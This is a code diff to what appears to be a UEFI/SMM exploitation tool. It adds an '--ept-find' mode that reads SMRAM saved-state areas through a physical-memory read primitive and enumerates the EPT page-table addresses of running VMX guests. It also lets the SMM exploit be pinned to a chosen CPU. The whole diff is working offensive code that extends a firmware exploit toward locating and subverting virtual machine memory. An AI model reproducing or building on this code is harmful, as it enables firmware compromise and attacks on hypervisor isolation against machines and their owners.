@@ -90,6 +90,30 @@ typedef struct _SMM_HANDLER_CONTEXT
 
 } SMM_HANDLER_CONTEXT,
 *PSMM_HANDLER_CONTEXT;
+
+// SMM saved state area offset for each CPU
+#define SMM_SMI_ENTRY_CPU0 0x3f6800
+#define SMM_SMI_ENTRY_CPU1 0x3f7000
+#define SMM_SMI_ENTRY_CPU2 0x3f7800
+#define SMM_SMI_ENTRY_CPU3 0x3f8000
+
+// get SMM saved state area offset for given CPU
+#define SMM_SMI_ENTRY(_cpu_) (SMM_SMI_ENTRY_CPU0 + (0x800 * (_cpu_)))
+
+#define SMM_SAVED_STATE_EPT_ENABLE 0x7ee0
+#define SMM_SAVED_STATE_EPTP_VALUE 0x7ed8
+
+// get 4-KByte aligned EPT PML4 table address from EPTP value
+#define EPT_BASE(_val_) ((_val_) & ~0xfff)
+
+// get EPT paging-structure memory type: 0 = uncacheable (UC), 6 = write-back (WB)
+#define EPT_CACHEABLE(_val_) (((_val_) & 6) == 6)
+
+// get EPT page-walk length from EPTP
+#define EPT_PAGE_WALK_LEN(_val_) ((((_val_) >> 3) & 7) + 1)
+
+// number of CPU to run SMM exploit
+static unsigned long m_current_cpu = 0;
 //--------------------------------------------------------------------------------------
 // put SMM function into the separate executable section
 #pragma code_seg("_SMM")
@@ -451,7 +475,7 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
 
 #ifdef WIN32
 
-    SetThreadAffinityMask(GetCurrentThread(), 1);
+    SetThreadAffinityMask(GetCurrentThread(), 1 << m_current_cpu);
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 
 #else
@@ -777,6 +801,143 @@ unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
     return 0;
 }
 //--------------------------------------------------------------------------------------
+bool eptp_info(
+    int target, PUEFI_EXPL_TARGET custom_target, 
+    unsigned int cpu_num, unsigned long long addr,
+    unsigned int *ept_enable, unsigned long long *eptp)
+{    
+    #define SAVED_STATE_READ(_offs_, _val_, _len_)                          \
+                                                                            \
+        phys_mem_read(                                                      \
+            target, custom_target,                                          \
+            (void *)(addr + (_offs_)), (_len_), (unsigned char *)(_val_),   \
+            NULL)    
+
+    if (ept_enable)
+    {
+        if (SAVED_STATE_READ(
+            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPT_ENABLE, ept_enable, sizeof(unsigned int)) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+            return false;
+        }
+    }
+
+    if (eptp)
+    {
+        if (SAVED_STATE_READ(
+            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPTP_VALUE, eptp, sizeof(unsigned long long)) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+            return false;
+        }
+    }    
+       
+    return true;
+}
+//--------------------------------------------------------------------------------------
+#define EPT_FIND_MAX_ITEMS 0x100
+#define EPT_FIND_ATTEMPTS 500 
+#define EPT_FIND_WAIT 1
+
+bool ept_find(
+    int target, PUEFI_EXPL_TARGET custom_target,
+    int *items_found, unsigned long long **ept)
+{
+    // determinate SMRAM address
+    unsigned long long addr = smram_addr(target, custom_target);
+    if (addr == 0)
+    {
+        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
+        return false;
+    }
+
+    printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+
+    int items_size = EPT_FIND_MAX_ITEMS * sizeof(unsigned long long);
+    unsigned long long *items = (unsigned long long *)malloc(items_size);
+    if (items == NULL)
+    {
+        printf(__FUNCTION__"() ERROR: malloc() fails\n");
+        return false;
+    }    
+
+    memset(items, 0, items_size);
+
+    *ept = items;
+    *items_found = 0;
+
+#ifdef WIN32
+
+    SYSTEM_INFO sys_info;
+    GetSystemInfo(&sys_info);
+
+    unsigned int cpu_count = sys_info.dwNumberOfProcessors;
+
+#else
+
+    // ...
+
+#endif 
+
+    printf("%d logical processors found\n", cpu_count);
+
+    for (int n = 0; n < EPT_FIND_ATTEMPTS; n += 1)
+    {
+        for (unsigned int cpu_num = 0; cpu_num < cpu_count; cpu_num += 1)
+        {
+            unsigned int ept_enable = 0;
+            unsigned long long eptp = 0;
+
+            // get EPT information for each logical CPU
+            if (!eptp_info(target, custom_target, cpu_num, addr, &ept_enable, &eptp))
+            {
+                printf(__FUNCTION__"() ERROR: eptp_info() fails\n");
+                return false;
+            }
+
+            if (ept_enable != 1 && ept_enable != 0)
+            {
+                // unexpected EPT enable value
+                continue;
+            }
+
+            if (EPT_BASE(eptp) == 0)
+            {
+                // no EPT present
+                continue;
+            }
+
+            // save EPT address
+            for (int i = 0; i < EPT_FIND_MAX_ITEMS; i += 1)
+            {
+                if (items[i] == eptp)
+                {
+                    // value is already known
+                    break;
+                }
+                else if (items[i] == 0)
+                {
+                    // it's a new value
+                    items[i] = eptp;
+                    *items_found = *items_found + 1;
+                    break;
+                }
+            }
+        }
+
+#ifdef WIN32
+
+        Sleep(EPT_FIND_WAIT);
+#else
+        // ...
+#endif
+
+    }
+
+    return true;
+}
+//--------------------------------------------------------------------------------------
 int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_path)
 {
     int ret = -1;
@@ -924,7 +1085,9 @@ int _tmain(int argc, _TCHAR* argv[])
     unsigned long long length = 0;        
     const char *data_file = NULL;
     void *mem_read = NULL, *mem_write = NULL;
-    bool use_dse_bypass = false, use_test = false, use_smram_dump = false, use_mem_dump = false;
+    bool use_dse_bypass = false, use_test = false;
+    bool use_smram_dump = false, use_mem_dump = false;
+    bool use_ept_find = false;
     
     SMM_HANDLER_CONTEXT context;
     memset(&context, 0, sizeof(context));
@@ -984,6 +1147,11 @@ int _tmain(int argc, _TCHAR* argv[])
         {
             // dump physical memory
             use_mem_dump = true;
+        }
+        else if (!strcmp(argv[i], "--ept-find"))
+        {
+            // find EPT addresses for all of the running VMX guests
+            use_ept_find = true;
         }
         else if (!strcmp(argv[i], "--length") && i < argc - 1)
         {
@@ -1150,6 +1318,28 @@ int _tmain(int argc, _TCHAR* argv[])
                 {
                     // dump all of the memory contents to file
                     ret = phys_mem_dump(target, &custom_target, data_file);
+                }
+                else if (use_ept_find)
+                {
+                    
+                    int items_found = 0;
+                    unsigned long long *ept = NULL;
+                    
+                    // find running VMX virtual machines and get their EPTP values
+                    if (ept_find(target, &custom_target, &items_found, &ept))
+                    {
+                        printf("%d running VMX virtual machines found, addresses of EPT PML4:\n", items_found);
+
+                        for (int i = 0; i < items_found; i += 1)
+                        {
+                            printf(
+                                "  #%.2d: 0x%llx, levels = %d, cacheable = %s\n", 
+                                i, EPT_BASE(ept[i]), EPT_PAGE_WALK_LEN(ept[i]), EPT_CACHEABLE(ept[i]) ? "y" : "n"
+                            );
+                        }
+
+                        free(ept);
+                    }
                 }
                 else
                 {
